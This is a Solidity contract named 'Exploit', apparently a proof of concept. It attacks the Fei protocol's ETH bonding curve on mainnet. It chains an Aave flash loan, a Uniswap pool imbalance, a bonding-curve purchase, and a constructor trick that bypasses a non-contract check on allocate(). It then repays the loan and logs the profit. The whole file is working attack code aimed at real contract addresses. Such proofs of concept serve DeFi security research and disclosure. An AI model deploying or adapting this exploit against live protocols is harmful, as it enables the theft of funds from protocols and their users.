pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

interface  IUpdateableOracle {
    function update() external;
}
interface IAaveLendingPool {
	function flashLoan(
		address receiverAddress,
		address[] calldata assets,
		uint256[] calldata amounts,
		uint256[] calldata modes,
		address onBehalfOf,
		bytes calldata params,
		uint16 referralCode
	  ) external;

}
interface IUniswapV2Router02 {
	  function swapExactTokensForTokens(
			uint amountIn,
			uint amountOutMin,
			address[] calldata path,
			address to,
			uint deadline
			) external returns (uint[] memory amounts);
}
interface IBondingCurve {
    function purchase(address to, uint256 amountIn)
        external
        payable
        returns (uint256 amountOut);
    function allocate() external;

}
interface IWETH {
    function withdraw(uint) external;
    function approve(address, uint) external returns(bool);
    function balanceOf(address) external view returns(uint);
}

interface IERC20 {
    function approve(address, uint) external returns(bool);
    function balanceOf(address) external view returns(uint);
}

interface ILendingPoolAddressesProvider {
}

interface ILendingPool {
}

interface IFlashLoanReceiver {
  function executeOperation(
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata premiums,
    address initiator,
    bytes calldata params
  ) external returns (bool);
}

import "hardhat/console.sol";

contract Allocator {
    constructor(IBondingCurve bondingCurve) public {
        // We run this call from a constructor
        // to bypass the non-contract check of `allocate()`
        bondingCurve.allocate();
    }
}

contract Exploit is IFlashLoanReceiver {

    IWETH private immutable WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private immutable FEI = IERC20(0x956F47F50A910163D8BF957Cf5846D573E7f87CA);

    IAaveLendingPool private immutable AAVE_LENDING_POOL = IAaveLendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IUniswapV2Router02 private immutable ROUTER_02 = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    IUpdateableOracle private immutable UNISWAP_ORACLE = IUpdateableOracle(0x087F35bd241e41Fc28E43f0E8C58d283DD55bD65);
    IBondingCurve private immutable ETH_BONDING_CURVE = IBondingCurve(0xe1578B4a32Eaefcd563a9E6d0dc02a4213f673B7);

    uint private _aavePremium;
    uint private _d;
    uint private _b;

    function start(uint d, uint b) external {

        _d = d;
        _b = b;

        UNISWAP_ORACLE.update();
        console.log("Updated oracle");

        // 1. Get WETH flashloan from Aave
        address[] memory assets = new address[](1);
        assets[0] = address(WETH);
        uint[] memory amounts = new uint[](1);
        amounts[0] = d + b;
        uint[] memory modes = new uint[](1);
        modes[0] = 0;
        AAVE_LENDING_POOL.flashLoan(address(this), assets, amounts, modes, address(0), "", 0);

        // END - After Aave .flashLoan returns

        console.log("");
        console.log("##################################");
        console.log("ETH balance", WETH.balanceOf(address(this)), WETH.balanceOf(address(this)) / 10**18);
    }

    function dump() internal {
        // 2. Inbalance pool: dump ETH
        WETH.approve(address(ROUTER_02), _d);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(FEI);
        ROUTER_02.swapExactTokensForTokens(_d, 1, path, address(this), 2**32 - 1);// uint(-1));
        console.log("Dumped", _d / 10**18, "ETH on WETH/FEI pool");

        buyFromBondingCurve();
    }

    function buyFromBondingCurve() internal { 
        // 3. Buy Fei on bonding curve
        WETH.withdraw(_b);
        ETH_BONDING_CURVE.purchase{value: _b}(address(this), _b);
        console.log("Bought Fei from bonding curve for", _b / 10**18, "ETH");

        allocate();
    }

    function allocate() internal {
        // 4. Allocate ETH from bonding curve purchase
        new Allocator(ETH_BONDING_CURVE);
        console.log("Allocated ETH from Fei protocol");

        buyback();
    }

    function buyback() internal {
        // 5. Buy WETH from WETH/FEI pool
        uint remainingBalance = FEI.balanceOf(address(this));
        FEI.approve(address(ROUTER_02), remainingBalance);
        address[] memory path = new address[](2);
        path[0] = address(FEI);
        path[1] = address(WETH);
        ROUTER_02.swapExactTokensForTokens(remainingBalance, 1, path, address(this), 2**32 - 1); //uint(-1));
        console.log("Swapped", remainingBalance / 10**18, "Fei on WETH/FEI pool");
        
        repayETH();
    }

    function repayETH() internal {
        // 6. Approve Aave for flashloan payback
        WETH.approve(address(AAVE_LENDING_POOL), _d + _b + _aavePremium);
    }

    function executeOperation(address[] calldata assets, uint256[] calldata amounts, uint256[] calldata premiums, address initiator, bytes calldata params) external override returns (bool) {
        _aavePremium = premiums[0];
        console.log("Received WETH flashloan with premium", _aavePremium / 10**18);
        dump();
        console.log("Repaying ETH flashloan");
        return true;
    }

    receive() external payable {}
}